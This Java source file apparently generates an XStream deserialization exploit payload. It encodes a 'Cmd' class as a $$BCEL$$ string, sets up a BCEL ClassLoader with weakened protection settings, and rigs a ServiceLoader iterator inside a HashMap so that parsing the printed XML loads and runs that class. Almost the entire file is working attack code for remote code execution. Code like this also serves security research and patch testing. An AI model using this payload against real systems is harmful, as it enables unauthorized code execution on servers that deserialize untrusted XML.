import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.thoughtworks.xstream.XStream;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.IOException;
import java.util.HashMap;
import java.util.Hashtable;

public class BCELPayload {

    public static void main(String[] args) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        CtClass cc = classPool.get("Cmd");
        byte[] classbytes = cc.toBytecode();
        Class clazz = cc.toClass();
        // javaassist的toclass生成的类只有newInstance后才调用静态块
        // Cmd c = (Cmd)clazz.newInstance();

        String bcel = "$$BCEL$$" + Utility.encode(classbytes, true);

        Object classLoader = makeBCELClassLoader();
        Object serviceLoader = ImageIOPayload.createWithoutConstructor(Class.forName("java.util.ServiceLoader"));
        Object it = ImageIOPayload.createWithoutConstructor(Class.forName("java.util.ServiceLoader$LazyIterator"));
        ImageIOPayload.setFieldValue(it, "nextName", bcel);
        ImageIOPayload.setFieldValue(it, "service", Object.class);
        ImageIOPayload.setFieldValue(it, "loader", classLoader);
        ImageIOPayload.setFieldValue(it, "this$0", serviceLoader);

        HashMap map = ImageIOPayload.makeIteratorTriggerNative(it);

        XStream xs = new XStream();
        String xml = xs.toXML(map);
        System.out.println(xml);
        //xs.fromXML(xml);
    }

    public static Object makeBCELClassLoader() throws Exception {
        Class<?> clazz = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
        Object classLoader = clazz.newInstance();
        ImageIOPayload.setFieldValue(classLoader, "ignored_packages", new String[]{});
        Object defaultDomain = ImageIOPayload.getFieldValue(classLoader, "defaultDomain");
        ImageIOPayload.setFieldValue(defaultDomain, "codesource", null);
        ImageIOPayload.setFieldValue(defaultDomain, "classloader", null);
        ImageIOPayload.setFieldValue(classLoader, "defaultDomain", defaultDomain);
        ImageIOPayload.setFieldValue(classLoader, "assertionLock", null);
        ImageIOPayload.setFieldValue(classLoader, "parent", null);
        ImageIOPayload.setFieldValue(classLoader, "deferTo", null);

        Hashtable classes = (Hashtable) ImageIOPayload.getFieldValue(classLoader, "classes");
        classes.put("java.lang.Object", Object.class);
        classes.put("java.lang.Runtime", Runtime.class);
        classes.put("java.lang.Throwable", Throwable.class);
        classes.put("java.io.IOException", IOException.class);
        return classLoader;
    }
}
